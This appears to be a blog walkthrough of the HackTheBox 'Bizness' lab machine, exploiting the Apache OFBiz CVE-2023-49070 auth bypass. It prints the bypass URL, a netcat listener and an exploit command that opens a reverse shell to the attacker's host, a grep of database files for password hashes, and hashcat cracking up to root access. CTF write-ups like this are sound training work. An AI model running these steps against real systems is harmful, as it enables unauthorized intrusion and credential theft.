---
title: "CTF: Bizness (Linux, Easy)"
excerpt: "A detailed walkthrough of \"Bizness\" machine on HackTheBox."
tagline: ""
header:
  teaser: /docs/assets/images/teasers/ctf/bizness.png
  og_image: /docs/assets/images/teasers/ctf/bizness.png
  overlay_image: /docs/assets/images/teasers/ctf/bizness3.png
author_profile: false
share: false
tags:
  - HackTheBox
  - Linux
  - Difficulty-Easy
categories:
  - CTF
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

## Description

This is a detailed walkthrough of "Bizness" machine on HackTheBox platform that is based on Linux operating system and categorized as "Easy"
by difficulty (in reality, HtB staff has their own understading of difficulty levels, so this one can't be defined as "Easy" in the literal sense of the word!). The machine involves exploitation of CVE-2023-49070 - "Authentication Bypass Vulnerability in Apache OfBiz".

## Reconnaissance

To discover open ports and services on the machine, a classic tool **nmap** was utilized with the following commands:
```bash
nmap 10.10.11.252 -p- # scan all sports
nmap -sV 10.10.11.252 -p 80,443,8888,35309,40953 # perform version enumeration on interesting ports
```
Below are the results of nmap enumeration:
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/nmapscan.png" alt="">
  <figcaption></figcaption>
</figure>

Our ports of interest are 80 (http) and 443 (https) open. Port 8888 with SimpleHTTPServer was open by another player who already had a foothold on the system, so we will ignore it. Let's navigate to port 80 by browsing to *http://<MACHINE-IP>* (add "bizness.htb" with the IP address to resolv.conf file on your machine). The server redirects us to the HTTPs port on the machine and reveals a webpage:
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/biznesssite.png" alt="">
  <figcaption></figcaption>
</figure>

If one scrolls the page down to the very end, they will find that the website is powered by **Apache OfBiz**. This will be our research vector that will prepare us for the Weaponization phase. Other Reconnaissance techniques such as subdomain enumeration, path traversal, directory bruteforcing and others led to no result.

### CVE-2023-49070

Searching for existing vulnerabilities, the eye-catching was a recent one listed under **CVE-2023-49070**. It describes an authentication bypass possible due to flawed logic in handling password change parameters in XML-RPC code. Attacks can leverage this technique to achieve Remote Code Execution on the target through Insecure Object Deserialization vulnerabilities discovered previously in Apache/Java backends.

> How CVE-2023-49070 Works\
Pre-auth RCE Apache Ofbiz 18.12.09#POC:
/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y
\
This vulnerability concerned an authentication bypass related to the deprecated XML-RPC interface in OFBiz. Specifically the logic checked for a requirePasswordChange parameter and would return requirePasswordChange even with empty or invalid credentials. This allowed the later authentication check to be skipped.

For those interested in developing a deeper understanding, you are welcome to visit the source [article](https://thesecmaster.com/fixing-authentication-bypass-vulnerabilities-in-apache-ofbiz-cve-2023-49070-cve-2023-51467/) with CVE description.

## Weaponization

Explore GitHub for available exploits that could help us achieve foothold on the system. The are several repositories available for the CVE of interest, the exploit that has worked for the author can be downloaded from [here](https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC/blob/main/exploit.py).

In order to use the exploit, one has to take some time to adapt it and make it work. Firstly, it requires the use of **ysoserial**, which is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. You can find the tool (filename: "ysoserial-all.jar") [here](https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar). Place it in the <ins>same directory</ins> as the exploit downloaded previously.

Additionally, the exploit requires <ins>Java version 11</ins> to run. Install it with the following command:
```bash
sudo apt-get install openjdk-11-jre
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/java11.png" alt="">
  <figcaption>Java 11 installation.</figcaption>
</figure>

Configure Java to use Java 11:
```bash
sudo update-alternatives --config java
1 # your list may have a different order, select the number that corresponds to Java 11
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/java11config.png" alt="">
  <figcaption>Java 11 installation.</figcaption>
</figure>

It's time to strike!

## Exploitation / Foothold

* Start a reverse shell listener with Netcat on the desired port:
```bash
nc -lnvp <port>
```

* Run the prepared exploit with the "shell" option to send a reverse shell to the Netcat listener:
```bash
python3 exploit.py https://bizness.htb/ shell <ip>:<port>
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/exploit.png" alt="">
  <figcaption>Running the exploit.</figcaption>
</figure>

If everything was configured and executed correctly, a reverse shell will be sent to the attacker's machine:
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/revshell.png" alt="">
  <figcaption>Foothold achieved.</figcaption>
</figure>

### User flag

Navigate to the ofbiz user $home directory and obtain the flag:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/userflag.png" alt="">
  <figcaption>+10 points!</figcaption>
</figure>


## Privilege Escalation

It is known that we are dealing with Apache OfBiz. By analzying its official [documentantion](https://cwiki.apache.org/confluence/display/OFBIZ/Home) as well as other resources, it is possible to discover that the default database used by the application is a Derby database. To discover its location on the system, one may execute the following command:

```bash
find / -type d -iname "derby" 2> /dev/null #Find the specified directory and redirect error output to /dev/null
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/findderby.png" alt="">
  <figcaption>Database location discovered.</figcaption>
</figure>

Navigate to */opt/ofbiz/runtime/data/derby/ofbiz/seg0* directory and discover a list of .dat database files in there. The administator password hash can be discovered by searching for the string "password=" in all files with the following command:

```bash
find *.dat | xargs grep -a -i "password="
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/passwordhash.png" alt="">
  <figcaption>Administrator password hash discovered.</figcaption>
</figure>

Unfortunately, this is <ins>NOT</ins> a straight hash to crack. The challenger has to spend time to analyze the [source code](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java) of the application's hashing function to figure out how password hash is generated and then reverse the process.
According to the source code, the password string get converted to a hexadecimal value, then to Base64 (URL-safe) with the salt specified after the hash type. In our case, the salt is "d" in the full hash string. It is possible to obtain the required hash value to crack using CyberChef. Decode the hash value from Base64 (selecting "URL Safe" from the "Alphabet" dropdown menu), then convert it to Hex and use the rule to remove the spaces for your comfort. The process is shown on the screenshot below:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/cyberchef.png" alt="">
  <figcaption></figcaption>
</figure>

Now, it has become possible to use Hashcat to crack the final hash value that was obtained. Supply it to Hashcat in the format \<hash\>:\<salt\> with the following flags:

```bash
hashcat -a 0 -m 120 <hash>:<salt> /path/to/wordlist
#-a 0 => Dictionary attack mode
#-m 120 => SHA1 hash type
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/hashcracked.png" alt="">
  <figcaption>Password discovered.</figcaption>
</figure>

### Root flag

Use discovered password to log in as **root** on the system and get the flag:

```bash
su root
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/bizness/root.png" alt="">
  <figcaption>+20 points!</figcaption>
</figure>

**Thank you for your attention and happy hacking!**
{: .notice--primary}
